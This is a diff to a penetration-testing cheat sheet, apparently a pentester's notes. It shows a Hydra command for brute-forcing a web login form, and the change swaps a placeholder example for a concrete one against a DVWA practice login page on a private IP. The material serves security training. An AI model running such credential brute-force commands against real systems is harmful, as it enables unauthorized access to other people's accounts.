@@ -328,7 +328,7 @@ Login using Burp or check in developers tools to check the request for the requi
 https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
 ```
 hydra -L <USERNAMEFILE> -P <PASSWORDFILE> <IP> http-post-form "<LOGINPAGE>:<USERNAME PARAMETER>=^USER^&<PASSWORD PARAMETER>=^PASS^&<LOGIN PARAMETER>:<Error Message>"
-#EXAMPLE hydra -l <USER> -p <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
+#EXAMPLE hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
 ```
 
 # Post Exploitation
